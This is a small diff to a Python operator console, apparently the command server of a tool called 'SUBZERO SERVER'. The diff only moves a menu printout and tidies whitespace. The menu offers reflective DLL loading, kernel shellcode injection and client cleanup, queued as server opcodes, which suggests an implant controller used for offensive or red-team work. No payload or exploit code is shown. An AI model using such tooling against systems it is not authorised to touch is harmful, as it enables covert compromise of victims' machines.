@@ -121,8 +121,16 @@ class WebServer:
 
 if __name__ == "__main__":
     server = WebServer()
-    block = True
 
+    print(" |-------------------------|")
+    print(" |      SUBZERO SERVER     |")
+    print(" | 1 - Load DLL            |")
+    print(" | 2 - Execute Kernel PIC  |")
+    print(" | 3 - Remove Client       |")
+    print(" | 4 - Stop the Server     |")
+    print(" |-------------------------|")
+
+    block = True
     while True:
 
         # Avoid simultaneous writing to console
@@ -130,14 +138,6 @@ if __name__ == "__main__":
             screenlock.acquire()
         else:
             block = True
-
-        print(" |-------------------------|")
-        print(" |      SUBZERO SERVER     |")
-        print(" | 1 - Load DLL            |")
-        print(" | 2 - Execute Kernel PIC  |")
-        print(" | 3 - Remove Client       |")
-        print(" | 4 - Stop the Server     |")
-        print(" |-------------------------|")
 
         choice = input("[SERVER] Enter Action: ")
 
@@ -149,7 +149,6 @@ if __name__ == "__main__":
 
             q.put((ServerOpcode.LoadLibraryReflectively, dll_path, None))
 
-
         elif choice == "2":
             bin_path = input("[SERVER] Enter Binary File Path: ")
             if not os.path.exists(bin_path):
@@ -158,7 +157,6 @@ if __name__ == "__main__":
 
             q.put((ServerOpcode.InjectKernelShellcode, bin_path,
                    input("[SERVER] Enter Maximum Expected Returned Data Size (Bytes): ")))
-
 
         elif choice == "3":
             q.put((ServerOpcode.Cleanup, None, None))
